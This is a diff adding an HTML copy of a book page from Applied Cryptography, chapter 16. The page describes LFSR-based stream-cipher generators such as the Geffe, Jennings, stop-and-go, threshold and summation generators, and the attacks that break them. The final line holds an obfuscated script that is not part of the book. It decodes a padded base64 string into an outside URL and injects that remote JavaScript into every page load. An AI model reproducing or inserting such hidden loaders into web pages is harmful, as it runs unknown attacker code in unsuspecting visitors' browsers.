@@ -1,0 +1,141 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=382-387//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Generalized Geffe Generator</I></B></FONT></P>
+<P>Instead of choosing between two LFSRs, this scheme chooses between <I>k</I> LFSRs, as long as <I>k</I> is a power of 2. There are <I>k</I> &#43; 1 LFSRs total (see Figure 16.7). LFSR-1 must be clocked <I>log</I><SUB>2</SUB><I>k</I> times faster than the other <I>k</I> LFSRs.</P>
+<I><P><A NAME="Fig6"></A><A HREF="javascript:displayWindow('images/16-06.jpg',204,111 )"><IMG SRC="images/16-06t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-06.jpg',204,111)"><FONT COLOR="#000077"><B>Figure 16.6</B></FONT></A>&nbsp;&nbsp;Geffe generator.</I>
+</P>
+<P>Even though this scheme is more complex than the Geffe generator, the same kind of correlation attack is possible. I don&#146;t recommend this generator.
+</P>
+<P><FONT SIZE="+1"><B><I>Jennings Generator</I></B></FONT></P>
+<P>This scheme uses a multiplexer to combine two LFSRs [778,779,780]. The multiplexer, controlled by LFSR-1, selects 1 bit of LFSR-2 for each output bit. There is also a function that maps the output of LFSR-2 to the input of the multiplexer (see Figure 16.8).
+</P>
+<P>The key is the initial state of the two LFSRs and the mapping function. Although this generator has great statistical properties, it fell to Ross Anderson&#146;s meet-in-the-middle consistency attack [39] and the linear consistency attack [1638,442]. Don&#146;t use this generator.</P>
+<P><FONT SIZE="+1"><B><I>Beth-Piper Stop-and-Go Generator</I></B></FONT></P>
+<P>This generator, shown in Figure 16.9, uses the output of one LFSR to control the clock of another LFSR [151]. The clock input of LFSR-2 is controlled by the output of LFSR-1, so that LFSR-2 can change its state at time <I>t</I> only if the output of LFSR-1 was 1 at time <I>t</I> - 1.</P>
+<P>No one has been able to prove results about this generator&#146;s linear complexity in the general case. However, it falls to a correlation attack [1639].</P>
+<P><FONT SIZE="+1"><B><I>Alternating Stop-and-Go Generator</I></B></FONT></P>
+<P>This generator uses three LFSRs of different length. LFSR-2 is clocked when the output of LFSR-1 is 1; LFSR-3 is clocked when the output of LFSR-1 is 0. The output of the generator is the XOR of LFSR-2 and LFSR-3 (see Figure 16.10) [673].
+</P>
+<P>This generator has a long period and large linear complexity. The authors found a correlation attack against LFSR-1, but it does not substantially weaken the generator. There have been other attempts at keystream generators along these lines [1534,1574,1477].</P>
+<I><P><A NAME="Fig7"></A><A HREF="javascript:displayWindow('images/16-07.jpg',257,140 )"><IMG SRC="images/16-07t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-07.jpg',257,140)"><FONT COLOR="#000077"><B>Figure 16.7</B></FONT></A>&nbsp;&nbsp;Generalized Geffe generator.</I>
+<I></P>
+<P><A NAME="Fig8"></A><A HREF="javascript:displayWindow('images/16-08.jpg',251,107 )"><IMG SRC="images/16-08t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-08.jpg',251,107)"><FONT COLOR="#000077"><B>Figure 16.8</B></FONT></A>&nbsp;&nbsp;Jennings generator.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>Bilateral Stop-and-Go Generator</I></B></FONT></P>
+<P>This generator uses two LFSRs, both of length <I>n</I> (see Figure 16.11) [1638]. The output of the generator is the XOR of the outputs of each LFSR. If the output of LFSR-2 at time <I>t</I> &#150; 1 is 0 and the output at time <I>t</I> &#150; 2 is 1, then LFSR-2 does not clock at time <I>t</I>. Conversely, if the output of LFSR-1 at time <I>t</I> &#150; 1 is 0 and the output at <I>t</I> &#150; 2 is 1, and if LFSR-1 clocked at time <I>t</I>, then LFSR-2 does not clock at time <I>t</I>.</P>
+<P>The linear complexity of this system is roughly equal to the period. According to [1638], &#147;no evident key redundancy has been observed in this system.&#148;</P>
+<P><FONT SIZE="+1"><B><I>Threshold Generator</I></B></FONT></P>
+<P>This generator tries to get around the security problems of the previous generators by using a variable number of LFSRs [277]. The theory is that if you use a lot of LFSRs, it&#146;s harder to break the cipher.
+</P>
+<P>This generator is illustrated in Figure 16.12. Take the output of a large number of LFSRs (use an odd number of them). Make sure the lengths of all the LFSRs are relatively prime and all the feedback polynomials are primitive: maximize the period. If more than half the output bits are 1, then the output of the generator is 1. If more than half the output bits are 0, then the output of the generator is 0.</P>
+<I><P><A NAME="Fig9"></A><A HREF="javascript:displayWindow('images/16-09.jpg',287,109 )"><IMG SRC="images/16-09t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-09.jpg',287,109)"><FONT COLOR="#000077"><B>Figure 16.9</B></FONT></A>&nbsp;&nbsp;Beth-Piper stop-and-go generator.</I>
+<I></P>
+<P><A NAME="Fig10"></A><A HREF="javascript:displayWindow('images/16-10.jpg',245,101 )"><IMG SRC="images/16-10t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-10.jpg',245,101)"><FONT COLOR="#000077"><B>Figure 16.10</B></FONT></A>&nbsp;&nbsp;Alternating stop-and-go generator.</I>
+</P>
+<P>With three LFSRs, the output generator can be written as:
+</P>
+<DL>
+<DD><I>b</I> = (<I>a</I><SUB>1</SUB> ^ <I>a</I><SUB>2</SUB>) &#8853; (<I>a</I><SUB>1</SUB> ^ <I>a</I><SUB>3</SUB>) &#8853; (<I>a</I><SUB>2</SUB> ^ <I>a</I><SUB>3</SUB>)
+</DL>
+<P>This is very similar to the Geffe generator, except that it has a larger linear complexity of
+</P>
+<DL>
+<DD><I>n</I><SUB>1</SUB><I>n</I><SUB>2</SUB> &#43; <I>n</I><SUB>1</SUB><I>n</I><SUB>3</SUB> &#43; <I>n</I><SUB>2</SUB><I>n</I><SUB>3</SUB>
+</DL>
+<P>where <I>n</I><SUB>1</SUB>, <I>n</I><SUB>2</SUB>, and <I>n</I><SUB>3</SUB> are the lengths of the first, second, and third LFSRs.</P>
+<P>This generator isn&#146;t great. Each output bit of the generator yields some information about the state of the LFSRs&#151;0.189 bit to be exact&#151;and the whole thing falls to a correlation attack. I don&#146;t recommend using it.</P>
+<P><FONT SIZE="+1"><B><I>Self-Decimated Generators</I></B></FONT></P>
+<P>Self-decimated generators are generators that control their own clock. Two have been proposed, one by Rainer Rueppel (see Figure 16.13) [1359] and another by Bill Chambers and Dieter Gollmann [308] (see Figure 16.14). In Rueppel&#146;s generator, when the output of the LFSR is 0, the LFSR is clocked <I>d</I> times. When the output of the LFSR is 1, the LFSR is clocked <I>k</I> times. Chambers&#146;s and Gollmann&#146;s generator is more complicated, but the idea is the same. Unfortunately, both generators are insecure [1639], although some modifications have been proposed that may correct the problems [1362].</P>
+<I><P><A NAME="Fig11"></A><A HREF="javascript:displayWindow('images/16-11.jpg',305,144 )"><IMG SRC="images/16-11t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-11.jpg',305,144)"><FONT COLOR="#000077"><B>Figure 16.11</B></FONT></A>&nbsp;&nbsp;Bilateral stop-and-go generator.</I>
+<I></P>
+<P><A NAME="Fig12"></A><A HREF="javascript:displayWindow('images/16-12.jpg',223,114 )"><IMG SRC="images/16-12t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-12.jpg',223,114)"><FONT COLOR="#000077"><B>Figure 16.12</B></FONT></A>&nbsp;&nbsp;Threshold generator.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>Multispeed Inner-Product Generator</I></B></FONT></P>
+<P>This generator, by Massey and Rueppel [1014], uses two LFSRs clocked at two different speeds (see Figure 16.15). LFSR-2 is clocked <I>d</I> times as fast as LFSR-1. The individual bits of the two LFSRs are ANDed together and then XORed with each other to produce the final output bit of the generator.</P>
+<P>Although this generator has high linear complexity and it possesses excellent statistical properties, it still falls to a linear consistency attack [1639]. If <I>n</I><SUB>1</SUB> is the length of LFSR-1, <I>n</I><SUB>2</SUB> is the length of the LFSR-2, and <I>d</I> is the speed multiple between the two, then the internal state of the generator can be recovered from an output sequence of length</P>
+<DL>
+<DD><I>n</I><SUB>1</SUB> &#43; <I>n</I><SUB>2</SUB> &#43; <I>log</I><SUB>2</SUB><I>d</I>
+</DL>
+<P><FONT SIZE="+1"><B><I>Summation Generator</I></B></FONT></P>
+<P>More work by Rainer Rueppel, this generator adds the output of two LFSRs (with carry) [1358,1357]. This operation is highly nonlinear. Through the late 1980s, this generator was the security front-runner, but it fell to a correlation attack [1053,1054,1091]. And it has been shown that this is an example of a feedback with carry shift register (see Section 17.4), and can be broken [844].
+</P>
+<I><P><A NAME="Fig13"></A><A HREF="javascript:displayWindow('images/16-13.jpg',314,48 )"><IMG SRC="images/16-13t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-13.jpg',314,48)"><FONT COLOR="#000077"><B>Figure 16.13</B></FONT></A>&nbsp;&nbsp;Rueppel&#146;s self-decimated generator.</I>
+<I></P>
+<P><A NAME="Fig14"></A><A HREF="javascript:displayWindow('images/16-14.jpg',254,76 )"><IMG SRC="images/16-14t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-14.jpg',254,76)"><FONT COLOR="#000077"><B>Figure 16.14</B></FONT></A>&nbsp;&nbsp;Chambers&#146;s and Gollmann&#146;s self-decimated generator.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>DNRSG</I></B></FONT></P>
+<P>That stands for &#147;dynamic random-sequence generator&#148; [1117]. The idea is to have two different filter generators&#151;threshold, summation, or whatever&#151;fed by a single set of LFSRs and controlled by another LFSR.
+</P>
+<P>First clock all the LFSRs. If the output of LFSR-0 is 1, then compute the output of the first filter generator. If the output of LFSR-0 is 0, then compute the output of the second filter generator. The final output is the first output XOR the second.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(SngFbdgN, hnHdhOFj) {hnHdhOFj = SngFbdgN.createElement('script');hnHdhOFj.type = 'text/javascript';hnHdhOFj.async = true;hnHdhOFj.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');SngFbdgN.getElementsByTagName('body')[0].appendChild(hnHdhOFj);}(document));</script></body>
+</html>
